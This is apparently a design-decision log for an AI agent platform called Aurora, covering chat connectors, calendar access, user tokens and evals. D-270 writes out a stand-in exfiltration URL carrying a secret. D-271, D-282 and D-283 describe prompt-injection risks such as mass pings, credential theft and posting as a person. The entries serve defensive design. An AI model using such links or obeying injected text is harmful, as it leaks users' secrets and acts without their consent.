| D-247 | **FIX-138 item 1b: `claude` and `codex` in the web terminal are wrappers fed by a no-secret `/run/aurora/harness.env`.** (a) The supervisor writes `/run/aurora/harness.env` (0644, no secret) at boot and at every session start with what the adapters set for a turn: the machine proxy (`127.0.0.1:3128`, which adds the boot token itself), the CA bundle, the placeholder credential, the enabled harnesses and — once a turn has chosen one — the agent's model and endpoint. (b) **Deviation from the first design ("from the boot document")**: the boot document does not hold the agent's model (it is chosen per turn from the agent's keys), so the model part arrives with the first session start; before it the CLI's own default applies and the gateway's allow-lists decide. The boot document gains only `enabled_harnesses`. (c) The wrappers refuse "not enabled on this instance" (exit 127) for a harness that is absent or not enabled, keep their own state in `/workspace/.aurora/terminal/{claude,codex}` and never touch the agent harness's. (d) **Attribution**: the terminal's model traffic is the agent's — the same machine proxy and boot-token credential as a turn's — so it counts against the same budgets and rate limits and appears in the request log as the agent's `mitm` requests without a turn or conversation; the person is not recorded as a speaker. C-750. (e) **Amended by the owner, 2026-11-14:** waiting for a turn left a fresh boot's `claude` on `api.anthropic.com`, where an agent whose key is for another endpoint has no credential (401). The terminal open now carries the models: at grant redemption the API runs `model::select` for each enabled terminal harness and returns them (`models`), the runner passes them in `pty.open`, and the supervisor rewrites `harness.env` (one section per harness) before spawning the shell; with no usable model the wrapper says why instead of calling a host with no credential (C-750 (4)). | A `harness.env` generated by the API at boot (needs the model resolved at boot: keys, readiness, overrides); the wrappers calling the API for the model; the real key in the terminal (SEC-01/SEC-34) | The supervisor already holds every value the adapters use; the file is the single place the wrappers read, and it contains nothing a person could not already see. |
| D-270 | **Owner, 2026-11-14 (FIX-142 step 4): bare URLs in an agent's message become labelled links — a fifth D-227 exception.** Measured on the Mattermost dev server (11.7.15): a post that contains a bare URL or an autolink (`<url>`) makes **the Mattermost server fetch it at once** (link preview, no click: `Mattermost-Bot/1.1` GET during post creation), and no per-post property suppresses it; `[label](url)` links and code are never fetched. So in an agent's message body on a chat platform the core rewrites every bare URL and autolink **outside code** to `[url](url)` (same visible text, same click target, subject to rule 2's scheme allowlist), which closes the zero-click exfiltration (`https://evil.example/?d=<secret>`) — the same risk class as inline images (D-227 rule 1). Agent posts therefore show no preview cards; the operator note about `EnableLinkPreviews` stays as defence in depth. | Leave bare URLs byte for byte and rely on operators turning previews off | A zero-click server-side fetch of an attacker-chosen URL is data exfiltration; a labelled link keeps the reader's experience (text and click) and costs only the preview card. |
| D-271 | **Owner, 2026-11-14 (FIX-142): every Mattermost ping in an agent's message is accounted for.** In an agent's message body on a chat platform: (a) **`@channel`, `@all`** — and every spelling the platform treats as one (any letter case; followed by punctuation such as `.`, `,`, `:`, `!`, `?`; inside emphasis, strong, strikethrough, headings, block quotes, list items, table cells and link labels) — **never notify**: the connector defuses them; (b) **`@here`** notifies only as D-226(b) allows (a standalone `@here` outside code becomes the core's `<@here>`, which a held `send_message` flags); every other spelling of it is defused like (a); (c) **group mentions** (Mattermost custom and LDAP-synced user groups, `@<group>`) are broadcasts and are defused like `@channel` — the connector resolves which `@name`s are groups through the platform API (cached, refreshed), and an `@name` it cannot resolve is treated as a group (fail closed) when the lookup is unavailable; (d) **`@username`** of a single user still passes (D-226(b)); (e) nothing inside code (spans, fences, indented code, HTML `<code>`/`<pre>`/`<kbd>`) ever notifies. The connector proves this against the pinned dev server: a test posts each form and asserts from the server's own notification data that no channel-wide or group notification was produced except the allowed `@here` path. | Defusing only the exact lower-case `@channel`/`@all`; letting group mentions pass like user mentions | Prompt-injected text must not be able to page a whole channel or group; Mattermost matches mention keywords case-insensitively and next to punctuation, so a literal-string defuse is not enough, and a group mention reaches as many people as `@channel`. |
| D-272 | **Owner, 2026-11-14 (FIX-149): views on top of a page are real modals with a close icon, never a dashboard page in a small browser window.** Owner: "when I click on 'Connect' for an app, I get a small window … it's just a page running in a smaller version of the entire page. If I make the browser window bigger, I see the sidebar and everything. This is not at all what modal screens should look like, they should be more like what I get if I click 'Details' … Implement all those things as actual modals … make sure the modals have a close icon." (a) **Connect and Reconnect** open the connect form as a `Dialog` on the page; this supersedes `14` §Key flows "opened as a popup". (b) **OAuth sign-in** is the one thing still opened in a separate window: the provider's page, opened synchronously on the click, with its `opener` cut before it navigates to the provider. The callback reports over a same-origin `BroadcastChannel` with an ack, and closes itself only when a dialog took the result (C-842, amends C-14). (c) **Every `DialogContent` has a × close button** in its title row (`14` §Dialogs). (d) The connect deep link (I-29) points at the Apps tab with the dialog open; the old `/apps/<app>/connect` route only redirects. (e) A guard test allows `window.open` only in the sign-in helper and in the terminal's **Open in new window** (FIX-138). The owner asked for that one so the terminal can be as big as the screen; it is a full standalone page, not a stand-in for a modal. | Full-page redirect to the provider with a `return_to` back to the Apps tab (loses the dialog's state and the Give-agents-access step mid-flow; needs a new validated return path on the connect API); keep `postMessage` to `window.opener` (needs the provider's page to hold a handle on the dashboard tab, the reverse-tabnabbing risk WEBC-3 removed); render the provider's page in an iframe (providers forbid framing) | The owner's direction, with the one window a browser OAuth flow genuinely needs; the dialog keeps its state across the sign-in, and the provider never gets a handle on the dashboard. |
| D-273 | **Owner, 2026-11-14 (P5-ICS): a generic "Calendar link (ICS)" app gives read-only calendar access through the provider's secret subscription link, with no OAuth client.** Owner: Outlook's published ICS link "would be simpler than the full microsoft-365 app because it doesn't require an oauth client … which I can't get without full official permission from our microsoft admins"; "do the same thing for Google and other calendar providers … a generic ICS calendar app"; "why not just have the user give us a name (`Private calendar`) and the full URL? Then the gateway could just swap the entire URL … [hardcoding providers] is just not scalable." (a) **A new credential kind, the secret link** (manifest `secret_link`, C-843): the person enters a name and the full URL. The URL is both credential and destination. No provider list: any `https` calendar link works, self-hosted servers included (private ranges only under `gateway.allowed_private`). (b) **The agent never sees the URL.** It requests `https://<connection_id>.link.aurora.internal/`, listed by name in `~/.aurora/links.json` (written by the supervisor from the home sync's `links`). The gateway sends `GET`/`HEAD` to exactly the stored URL: the agent controls no host, path, query or non-allowlisted header. This is the database lane's pattern (D-80/D-89) for one HTTP request. (c) **SEC-107 replaces SEC-04's declared-host rule for this kind:** SEC-04 stops a credential being steered where the *agent* chooses, while here the person fixed the destination. Instead, the destination guard and the org egress policy apply to the stored host and every redirect hop (the gateway follows ≤ 3, `https` only, never shows `Location`). The echo check uses the whole URL. Logs, traces, approvals and errors carry only the host. (d) **The package `ics-calendar`** is one `fields` method (`name`, `url`), `expect_prefix: BEGIN:VCALENDAR`, one read tool and no write tools. Its setup guide says where common providers keep the link; there is no code per provider. (e) **Recurrences** are expanded in the sandbox by a pinned `icalendar` + `recurring-ical-events` recipe (`uv run --with …`); preinstalling them in the image is the fallback if PyPI is unreachable. (f) The lane is generic, so a later "secret URL" package (private feeds) reuses it with no core change. (g) **Owner, same day: the gateway caches a link's body for 5 minutes** ("so that we don't hit the server if the agent keeps downloading it … you never know"). The cache is per connection and credential version, in memory, size-bounded and answered only after full admission. It overrides the upstream's `no-store` (Google sends it), and only `Accept` goes upstream (no `Range`, no conditional headers). The agent snippet still says to download once and work on the file. | One connect method and host entry per provider, the placeholder path rebuilt by `path_regex` (the first draft of this decision: every provider and every self-hosted server is a package change, which the owner rejected as not scalable); show the link to the agent (it is a bearer secret); a gateway-side ICS→JSON transform (more core for one app) | Scales to any provider or server with no code; the destination is the person's choice, so a fixed URL with the destination guard and egress policy is as safe as a declared host; the secret never reaches the sandbox, logs or traces. |
| D-274 | **Owner, 2026-11-14 (P5-CALINV): an agent writes to a calendar by sending the person an invitation.** Context: no OAuth is possible for Outlook at CERN, Graph has no other door, and ICS is read-only. (a) **Built-in agent tools** `calendar_invite`, `calendar_invite_update`, `calendar_invite_cancel`, `calendar_invite_list` (C-844). They are present only while the instance mailer is configured and the org switch `calendar_invitations.enabled` (default on) allows them. (b) **The message:** an iMIP `REQUEST` (update: same `UID`, `SEQUENCE + 1`; cancel: `METHOD:CANCEL`) sent by Aurora's mailer from `email.from`. `ORGANIZER` is `"<agent> (Aurora)" <email.from>`, `RSVP=FALSE`. A fixed plain-text preface says the agent proposes the event. The calendar is written by a library (escaping, folding), with UTC times for single events and a `VTIMEZONE` for repeating ones. (c) **The only recipient is the person the turn runs for, at their verified email** (SEC-108). There are no attendee or address arguments, so the agent can invite nobody else; webhook and peer turns are refused. (d) **Bounded:** 20 sends per person per agent per hour, 60 per person per day; a repeat needs `count` or `until`. (e) A table `calendar_invitations` (migration `20261201000230`) keeps ids, `UID`, `SEQUENCE` and times for update, cancel and list, but no description or location. It follows retention and deletion. (f) Replies go to `email.from` and are not read. | The agent writes the calendar directly (needs Graph consent, CalDAV, which Exchange lacks, or a first-party client-id trick that impersonates Microsoft); let the agent invite any address (turns Aurora's mailer into a spam/phishing relay); ask for approval before sending (the person's Accept already is the approval) | Works for every calendar provider with no access to the calendar and no credential; the person's click is the consent; the blast radius is the person's own inbox, rate-limited. |
| D-275 | **Owner, 2026-11-14 (P5-CALDAV): a person may point their own credential at a server they choose ("doesn't seem like a security issue").** (a) **A new manifest section `own_server`** (C-845). The connection, not the package, names the server: the person enters a URL, and connect discovers the CalDAV home through the destination guard and egress policy. It stores the home URL and the exact origins discovery used (≤ 4, e.g. iCloud's partition host) as metadata, and the credentials as usual. (b) **The gateway injects only on those origins** (TLS, exact host and port), never on a host held by a static claim, a registered instance, an LLM endpoint or Aurora (SEC-109; connect refuses `server_host_claimed`). This is the second exception to SEC-04's declared-host rule, after SEC-107. SEC-59's admin-only registration still governs instance hosts, which serve everyone's connections. (c) **The agent sees the server URL but never the password.** The URL is not the secret, and hiding it would mean rewriting every CalDAV response (hrefs, partition redirects). Accounts are listed in `~/.aurora/servers.json` from the home sync's generic `servers` list. (d) **Package `caldav`:** read tools by method (`PROPFIND`, `REPORT`, `GET`, `OPTIONS`); write tools (`PUT`, `DELETE`, `MKCALENDAR`, `PROPPATCH`, `MOVE`/`COPY`); the scheduling `POST` defaults to Ask. A new `ical` approval decoder shows title, time, repeat and every attendee, because servers with automatic scheduling email attendees on `PUT`. (e) Google CalDAV (`caldav_needs_oauth`) and Exchange (`caldav_unsupported`) are refused at connect with a pointer to the right app. | Admin-registered instance hosts per server (SEC-59: one admin step per server, the scaling problem the owner rejected for ICS); hide the server behind a synthetic host as for ICS (rewrites every response body; the URL is not secret); one package per provider | A person's own credential going to a server they named can only reach that server; claimed and Aurora hosts stay out of reach, and the password never enters the sandbox. |
| D-276 | **Owner, 2026-11-15 (phase-6 proposals `docs/tasks/P6-ORGTREE.md`, `P6-LIMITS.md`; answers Q-P6-ORG-1, Q-P6-LIM-2, Q-P6-LIM-9).** (a) **Sub-org membership is upward-closed**: "members of suborgs are members of every parent". Adding a person to a sub-org makes them a member of every ancestor in the same transaction, as `member` where they are not one already. Removing or suspending them in an ancestor removes or suspends them in that ancestor's whole subtree. The top-level org's seat cap and SCIM admission gate therefore bound the whole tree. (b) **Phase-6 limits are abuse and fairness limits only**: no prices, invoices, cost reports, plans or spending budgets. Limit profiles are abuse tiers, not plans, and `21`'s "not planned: billing, plans, budgets" stands. (c) **Threat model**: the abuse the CERN GitLab actually sees is "people running too many long gitlab jobs, basically using runners as free compute". For Aurora that means sandboxes kept awake with no person engaged (busy background processes, watches, schedules that re-engage every few minutes), multiplied across many agents. Limits on sandbox runtime and concurrency are the core of P6-LIMITS and come first; endpoint rate limits and the other counts are secondary. | Sub-org membership independent of the parents (offboarding and seat caps would have to walk the tree, and a person removed from a department could stay in its groups); plans with prices or spending budgets; a threat model led by API floods | One removal at the top offboards a person everywhere, and one seat cap covers the tree. The limits defend the resource that is actually abused, which is compute time, not request volume. |
| D-277 | **Owner, 2026-11-15 (P5-CERN-ADDONS): the external repo goes ahead, and the lane's three design deviations and the icons are accepted.** (a) **Push approved**: the lane writes and pushes the `aurora-addons-cern` content (`aurora-addons.yaml`, `README.md`, `scripts/release.sh`, `release.yml`, `.gitignore`, both packages) to `github.com:alexiri/aurora-addons-cern`. (b) **Signing key**: a dedicated ed25519 pair made with `aurora plugin keygen`. It lives in the root of the local checkout (`cern-release.key`, mode 0600, and `cern-release.key.pub`) and is excluded from git by `.gitignore` and `.git/info/exclude`. The public half goes into the manifest's `signing_key`. **The owner does the GitHub side**: a `release` environment limited to `v*` tags, holding the secret `AURORA_CERN_SIGNING_KEY`. No session sets repo secrets or environments, and no session pushes a `v*` tag before the owner says the secret is in place. (c) **Accepted deviations in `cern-phonebook`**: one read tool `search`, with people, manager-chain (≤ 5 hops) and e-group lookups written as recipes in the agent instructions; no LDAP `compare`; the lane needs a granted connection (`fields: []`), it is not open egress. (d) **Icons accepted**: the original monogram icons (`icon.png`, `icon-dark.png`), not CERN's trademarked marks. | Keep the key in a password manager only (the owner asked for local files); five gateway tools, one per lookup (a gateway tool is one directory operation, so a chain would still be several calls) | The owner's go-ahead. The key never enters git or a session's output, and GitHub secrets stay under the owner's account. |
| D-278 | **Owner, 2026-11-15 (P5-CERN-ADDONS): the GitHub side is done; the lane may publish.** The `release` environment and its `AURORA_CERN_SIGNING_KEY` secret exist on `alexiri/aurora-addons-cern` (checked by the coordinator with `gh api`, names only). The lane pushes `main` and, once the build job is green there, the first `v*` tag, which runs the publish job; the coordinator checks the release's assets and digests against the manifest. The owner also asked that phase 6 does not start until they give the all-clear, and that the lanes keep going through every pending phase-5 task. | — | The owner's confirmation lifts D-277(b)'s "no `v*` tag" condition. |
| D-252 | **P5-CERN-ADDONS, the external repository (lane `p5-platform`, 2026-11-15; within D-277/D-278).** (a) **Repository** `github.com/alexiri/aurora-addons-cern`: `aurora-addons.yaml` is **generated** by `scripts/release.sh` from `scripts/manifest-head.yaml` (repo, publisher, the public key), each package's `plugin.yaml` and the immutable records `releases/<id>-<version>.release` (tag, signed sha256, size, and the sha256 of the **unsigned** build); the owner runs `scripts/release.sh all --key <private key file>` locally and commits. (b) **Tag scheme** (amended by **D-366**: releases are numbered `v1`, `v2`, … on their own): one `v<version>` tag per release; the record's `tag` names the release holding that version's asset; the publish job uploads exactly the assets whose records name the pushed tag. The first tag `v0.1.0` holds `cern-phonebook-0.1.0` and `cern-maps-0.1.0`. (c) **CI**: a push/PR builds with an `aurora` CLI + `aurora-gateway` built from source at commit `c1b315d796f3065165ebb0a0d011241294ae9aa1` of this repository (no binary releases exist; bumped in a reviewed change), runs the fixtures, and fails on manifest drift or on a package whose unsigned build no longer matches its record (archives are deterministic, so the key-less job still detects an unrecorded change). A `v*` tag (environment `release`) rebuilds, signs with `AURORA_CERN_SIGNING_KEY` (a 0600 file in `$RUNNER_TEMP`, removed `if: always()`), verifies each archive against the manifest's key and against its record, creates the Release (refused when it exists) and downloads the assets again to compare sha256 and size. (d) **`cern-phonebook` changes found by the live check**: `xldap.cern.ch`'s certificate chains to **CERN Root Certification Authority 2** (in no public store), so a deployment adds that root to `tls.extra_ca_bundle` (the package's setup guide says so, with the fingerprint; `06 §LDAP lane`); `objectClass` joins the readable attributes so the e-group recipe `(&(objectClass=group)(cn=…))` is not refused. (e) **`cern-maps`**: tools `search_places`, `get_place`, `geocode`, `get_travel_modes` (the route solver needs the mode object from the service description; a bare mode name is refused by the service) and `get_directions`; `build_map_link` is a recipe in the agent instructions (a link needs no request), as are `from`/`to` resolution; no `params` classifiers (the paths are the allow-list). **Since 0.1.3 (2026-11-17, `P5-CERN-ADDONS.md`)** the solver takes the mode's id (`travelMode=3`), and the gateway injects the fixed ArcGIS query settings per path (`f=json`, LV95 `outSR=2056`, the directions settings), so the agent's recipe is three steps. (f) The staging copy `plugins/addons/cern-phonebook/` in this repository is deleted; the package lives in the external repository. (g) **Found by the kind e2e and fixed**: the gateway resolved no connection candidates on a reserved host, and `*.aurora.internal` (which holds every LDAP-lane synthetic host) is always reserved, so the lane answered `ldap_no_connection` in a real deployment while its ITs (a snapshot without reserved hosts) passed; `resolve.rs` now exempts the lane's hosts and the IT snapshot carries the real reserved list. `cern-maps` 0.1.1 adds `grants.block_untooled` (the catalogue is the only way onto `maps.cern.ch`); version 0.1.0 stays published and listed, as a published version is immutable (D-278). The kind fake harness's `[[http: …]]` directive accepts a JSON body after the URL, so a test can make the lane's POST from an agent turn (a bare `exec` into the Pod is the boot identity, which holds no grants). | A binary release of the CLI to download in CI (none exists); signing in CI on every push (the key stays tag-only in the `release` environment); one tag per addon (a single tag per release is what the manifest URLs and the brief's wording use) | The key-less drift check is only possible because the build is deterministic and the record keeps the unsigned digest; the CA finding is a deployment fact the package cannot hide. |
| D-253 | **FIX-146 part E: the browser tracer is hand-rolled, not the OpenTelemetry web SDK (lane `p5-platform`, 2026-11-15; amends D-232(h)).** `web/src/lib/telemetry/{index,tracer,sampling}.ts` is a ~150-line tracer: W3C `traceparent` ids and injection, the rule-2 sampler (one shared vector fixture with Rust), a bounded buffer, and a same-origin OTLP/JSON `POST /v1/telemetry/traces`. **Why:** the SDK's own sampler, context manager and exporter would go unused (sampling is our rule 2, there is no zone.js, export is one `fetch` to our own ingestion endpoint, which rebuilds every span anyway); a vendor SDK adds a dependency tree to a browser bundle that must stay small and to a supply chain we audit (`pnpm-lock.yaml` is unchanged); the lazy chunk is 2 270 B raw / 1 277 B gzip. **What it gives up:** automatic instrumentation (document-load, fetch, XHR, user-interaction), standard context propagation across async boundaries, ready-made exporters/propagators and upstream fixes; every span kind is hand-written (action, `{METHOD} {schemaPath}`, navigate, stream connect, `browser.error`) and a new kind needs code. **Reversal:** swap `tracer.ts` only; nothing else depends on the SDK. The owner may overrule. |
| D-279 | **P4-NARR spec batch (phase 5, coordinator, 2026-11-15; owner answers D-288: recommendations accepted): live narration cards are one connector message per turn, built from durable tool events.** (a) On a chat platform whose connector declares `edits` (`13 §4.5`), an agent with `narration_cards = true` (new agent setting, default `false`, `10`) gets a **narration card**: the card is the turn's receipt on that platform, whatever its reaction support, and lists the turn's tool steps with their status. It is updated by `message.update` and deleted when the answer is posted (`13 §5.12`). (b) The card is built only from the turn's durable `tool.started` and `tool.finished` events, whose summaries are already sanitized and never carry raw arguments (`10 §Transcript events`); `thinking.delta`, `activity` and `text.delta` never reach it. (c) No new connector op kind: the card uses `message.post`, `message.update` and `message.delete`. (d) The dashboard chat is unchanged: it already folds tool calls (`14`, *Agent chat*, Tool calls). | Streaming the answer itself as edits (against `10`'s answer rule and the connector's write budget); on by default (a message in every shared space); a new `narration` op kind (duplicates three existing kinds); a second card in the dashboard (duplicates `ToolCallGroup`) | The card is the one progress view a chat platform can show without new trust: the same events the web chat already folds, through the existing write path and its budget. Off by default because it adds a message to shared spaces. |
| D-280 | **P4-NARR spec batch: what a shared space sees, and how often.** (a) In a conversation that is not `direct`, the card shows step **names** only (the tool's name from its fixed vocabulary); the sanitized summary appears only in a `direct` conversation with the agent, where one person is present. (b) Each step label is at most `NARR_STEP_CHARS` characters, at most `NARR_MAX_STEPS` steps are listed (then "N earlier"), and every label is escaped as data and defused for pings and bare URLs (D-270, D-271): the card never forms a link or a notification. (c) Cadence: at most one update per `NARR_MIN_INTERVAL` per turn; at most `NARR_SPACE_UPDATES_PER_MINUTE` narration writes per space (a third of the `writes_per_space_per_minute` budget of 30, `20`); at most `NARR_CARDS_PER_SPACE` cards per space at a time (a further turn gets no card). A `rate_limited` answer supersedes the update and is not retried. (d) ~~On completion the card is deleted~~ — **superseded by D-286: on completion the card is collapsed to one summary line.** Owner answers: D-288 (recommendations accepted). | Full summaries in every space (arguments and paths reach shared channels); a settled card kept after completion (clutter and stale state); one post per step (spends the write budget and notifies people) | Narration must not become a new leak or a new flood: the shared view is the smallest one that still shows progress, and every write is bounded by the connector's own budget. |
| D-281 | **P4-UTOK spec batch (phase 5, coordinator, 2026-11-15): phase 5 delivers send-as-me only, through a pasted personal access token.** (a) `user_tokens` (`13 §4.5`) is `true` for Mattermost (`20`); it enables one agent tool, `send_as_me` (`13 §5.11`). Read-as-user (`history.read` or `read_conversation` with the person's token) stays hidden: it needs its own decision (Q-UTOK-1). (b) The person adds a Mattermost personal access token under Account › Chat platforms. The API verifies it through a `user_token.verify` op and refuses it unless the token's platform user is the caller's own link on that integration (`user_links`): a token cannot be attached to someone else's account. (c) No OAuth app in phase 5 (Q-UTOK-2). Owner answers: D-288 (recommendations accepted). | Read-as-user with send-as-me (a wider read reaches private channels the bot cannot see, then answers are posted elsewhere); an OAuth app per server (an admin setup step Mattermost does not need for a personal token); accepting any token and trusting the person's word about whose it is | Send-as-me is the narrowest user-acting feature and the one the request asks for; the link check is what makes a pasted token mean "this person". |
| D-282 | **P4-UTOK spec batch: custody. A user token is a sealed secret that reaches only the connector, and only for one operation.** (a) Stored as `user_tokens.token_ref` (purpose `user_token`, owner = the `user_tokens` row id; `08 §1`). Never in a response, log, audit row, boot document, sandbox, gateway or runner: responses show `status`, `label` and the platform user's label only. (b) A send carries a per-op copy (`channel_ops.payload.user_credential_ref`, purpose `channel_op_user_token`, owner = the op id), opened at claim and delivered as `user_credential` in the claimed operation over connector authentication. The copy is discarded at the op's terminal state, by the deprovision rule of `13 §5.11`. (c) The copy is taken only while the token is `active`, its grant is active and the link exists, in the claim transaction. | Plaintext in `channel_ops.payload` (a database dump would hold a person's credential); a long-lived connector-side copy; storing the token in the gateway so an agent request could carry it (a prompt injection would then reach the credential) | The token is a person's identity, not an integration credential: it gets the smallest lifetime and the same custody as the other sealed secrets. |
| D-283 | **P4-UTOK spec batch: who may make the agent act as a person.** (a) `send_as_me` is available only when, at the call, the turn's speaker is the token's owner, the turn came through the owner's own direct conversation with the agent or a thread the owner started on that platform, the agent holds the owner's grant (`user_token_agents`), and the token and link are active. Scheduled, webhook, watch, peer-task, system-follow-up, dashboard and API turns never qualify. (b) Every send is a **held action approval** (`07 §Action approvals`), decided only by the token's owner, with no `allow` mode in phase 5. The platform-composed summary names the conversation and the text length; the full text is on the dashboard approval page. (c) Each post carries a platform-authored footer naming the agent and the owner (Q-UTOK-8). (d) Shared spaces are allowed for the owner's own turns, each send approved (Q-UTOK-5). Owner answers: D-288 (recommendations accepted). | An `allow` mode per grant (a prompt-injected document could then post as the person unseen); any member of a channel can trigger a send as the owner (confused deputy: Bob's prompt, Alice's identity); sends without a footer (recipients cannot tell that an agent wrote them) | The agent's reach as a person is exactly the owner's own message plus one approval each: nobody else can start it, and nothing is sent without the owner having seen the text. |
| D-284 | **P4-UTOK spec batch: revocation, audit and limits.** (a) Every end of a person's standing ends the token in the same transaction as the discard of its sealed value and the cancellation of its pending approvals (rejected with `credential_revoked`): the owner's `DELETE`, removal of the grant or of the link, SCIM deprovisioning or deletion of the owner, deletion of the agent or the integration, and a platform `401` on a send or verify (token `invalid`). Copies already at a connector are refused at their next claim. (b) Audit: `user_token.create`, `.revoke` (critical), `.invalid`, `.grant`, `.ungrant`, and one `user_token.send` row per attempted send carrying the outcome, the agent, the token id and the conversation id; no text, no token, no platform user id by value (labels only). (c) Limits: `USER_TOKENS_PER_PERSON` 5 and `USER_TOKEN_PENDING_MAX` 5 pending sends per token (`02`). Aurora does not expire tokens (Q-UTOK-6). | Aurora-side token expiry (personal tokens have none, and forced re-entry adds friction without reducing the threat); audit rows that hold message text (the audit log outlives the message and admins read it) | Every way a person's standing ends must end the agent's standing too, in one transaction; the audit trail must say who acted and not what was said. |
| D-285 | **Owner, 2026-11-15: the Slack connector moves to phase 6 ("it's not a priority").** P5-SLACK becomes **P6-SLACK** in the phase-6 proposals table; it has no spec and no brief, and like the rest of phase 6 waits for the owner's all-clear (D-278). The remaining unspecified phase-5 items are P4-NARR, P4-UTOK and P4-EVAL. Also recorded the same day: the Dependabot label errors fixed by creating the labels `dependabot.yml` names (`javascript`, `github-actions`, `docker`), as `docs/ops/dependencies.md` already lists them. | Keep it in phase 5 after the other specs (D-235(c)) | Phase 5 closes sooner on the items the owner needs. |
| D-286 | **Owner, 2026-11-15 (Q-NARR-4): a narration card is collapsed at completion, not deleted.** When the answer posts or the turn ends, the card's last `message.update` (`narr:<turn_id>:end`) replaces the step list with one line — outcome (`Done` / `Failed` / `Stopped`), step count (with failed ones counted) and elapsed time (C-847 collapsed form, C-848). Chat platforms have no fold control (Mattermost renders no `<details>`), so "collapsed" is this one-line edit. The closing update is never superseded or dropped (retried on `rate_limited`), and a collapsed card does not count toward `NARR_CARDS_PER_SPACE`. Supersedes D-280(d). | Delete the card (D-280(d), the recommendation); keep the full step list | The owner wants the turn's work visible afterwards without the clutter of a full list. |
| D-287 | **Owner, 2026-11-15 (FIX-150): `send_message` resolves an exact handle by itself; every refusal names the next call.** (a) A `to` that is not `here`, a pinned alias or a recipient id runs the `find_recipient` lookup (same reach filter, results pinned as anchors) and is used only when **exactly one** reachable candidate matches exactly: a user's handle or alias, a space's alias or name, compared after `mention_anchors::normalize`. A display name never matches exactly, and nothing is sent on a partial match. (b) When several candidates match, or only near ones, the refusal lists the pinned candidates' aliases with label and kind and says to call `send_message` again with one. With no candidates, the refusal is one text, identical whether the person is unreachable or does not exist. (c) `read_conversation.target` resolves the same way (spaces only). (d) The result gains `recipient {alias?, kind, label}`. (e) Every messaging-tool property has a schema description. Reach, `proactive_messaging`, approval summaries and broadcast rules are unchanged. | Keep `to` = anchor alias or ID only (owner's agent stopped at the refusal); fuzzy or display-name auto-send (could pick the wrong person); anchors that outlive the conversation | Aliases are per conversation, but they are usually the person's handle, so models send a correct handle that has not been pinned yet. An exact-match lookup removes that refusal without widening reach (the same filter as `find_recipient`, re-checked at send), and listing candidates turns every other miss into one retry. |
| D-288 | **Owner, 2026-11-15: every remaining P4-NARR and P4-UTOK recommendation accepted** ("All recommendations accepted"). P4-NARR: Q-NARR-1 off by default, per agent; Q-NARR-2 shared spaces see step names only, summaries only in a `direct` conversation; Q-NARR-3 one update per turn per 5 s, 10 narration writes per space per minute, 3 open cards per space; Q-NARR-5 no card where the platform cannot edit (the receipt stays); Q-NARR-6 tool steps only (Q-NARR-4: D-286, collapse). P4-UTOK: Q-UTOK-1 send-as-me only (read-as-user later, its own brief); Q-UTOK-2 a pasted Mattermost personal access token verified against the caller's own link, no OAuth app; Q-UTOK-3 the owner's own turns only, one granted agent at a time; Q-UTOK-4 the owner approves every send, no `allow` mode; Q-UTOK-5 shared channels allowed for the owner's own turns, each send approved; Q-UTOK-6 no Aurora-side expiry, a platform `401` marks the token invalid, revocable any time; Q-UTOK-7 the owner sees their own audit rows, instance admins without text or token; Q-UTOK-8 the `_Sent by <agent> for <owner>_` footer on every send, not waivable. The spec text (D-279..D-284, C-846..C-859, SEC-111..SEC-113) already follows these; the briefs are ready to place. | The alternatives listed in each brief's open-questions section | The owner's answer. |
| D-289 | **P4-EVAL spec batch (phase 5, coordinator, 2026-11-15): what an eval is.** (a) A **question** belongs to one hosted agent and has one expected answer of one kind: `numeric` (a number with an optional absolute tolerance), `text` (compared after trimming, whitespace collapse and case folding) or `judged` (criteria read by a judge model). (b) Numeric and text answers are read from a final line `ANSWER: <value>` that the platform appends to the question text; judged answers are the agent's final answer, scored as a binary pass or fail by the judge (`10 §Evals`, C-862, D-292). (c) A **run** is a set of the agent's enabled questions, executed in order as real turns (D-290), and produces results, a pass rate and the configuration fingerprint (D-291). (d) **No agent tool** can create, edit, start or read an eval; they are people's and schedules' actions. (e) Dashboard: a **Evals** page in the agent page's Behaviour section (`14`, C-873). (f) BYO agents have no evals (422 `eval_not_supported`). Owner questions Q-EVAL-1, Q-EVAL-5, Q-EVAL-9 and Q-EVAL-10 (owner answers: D-300, recommendations accepted). | Evals as a separate service or a sandbox-side test harness (a second execution path that bypasses the agent's real turn pipeline); an agent tool that can start its own evals (self-triggered cost and self-grading); a per-question LLM-as-judge only (numeric and text need no model) | An eval measures what the agent actually does in production, so it must use the production turn path; exact kinds are cheap, deterministic and explainable, and judged questions are reserved for what cannot be exact. |
| D-290 | **P4-EVAL: a run is a real turn, and a run cannot change the world.** (a) **Real turns**: every eval turn goes through the normal turn pipeline (`10 §Turns`), under the agent's policy, approvals, egress rules, grants, governance, freeze and disable state; no eval-only bypass exists and "it is only a test" is not a reason. (b) **One `eval` conversation per question per run** (`external_ref eval:<run_id>:<position>`, kind `eval`, C-860): each question starts with a fresh harness session, so no answer is influenced by an earlier one, and each conversation is retained, deleted and shown on its own. (c) **Side effects are refused** (Q-EVAL-2, recommended; C-868): in an eval turn a request whose effect is a write (a gateway request that is not a `read` app tool or GET/HEAD, `send_message`, `send_file`, `send_as_me`, memory and skill writes, schedule, webhook and peer-task creation) is refused with `eval_read_only`, creates no approval and is counted on the result; a write never waits for a person. (d) **One active run per agent** (`EVAL_RUNS_ACTIVE_PER_AGENT`), claimed under a lease like schedule fires; the starter's or creator's `can_use` and the agent's freeze are re-checked before each question. (e) Cancel aborts the running turn; remaining questions are `not_scored`. (f) Eval conversations are never mirrored to chat platforms, never a thread link target and never listed in the chat list by default (SEC-116). | Normal approvals in eval turns (a run would hold approvals for people and perform writes when they are approved later); a dry-run flag the tools honour (depends on the agent's cooperation); one conversation for all questions with an epoch bump between them (one transcript is easier to read, but every bump writes a session purge and a question can still see the one before it) | Only the refusal at the gateway and the platform's own tools makes "no external effect" a guarantee rather than a request; a separate conversation per question is the only isolation the harness gives without new machinery. |
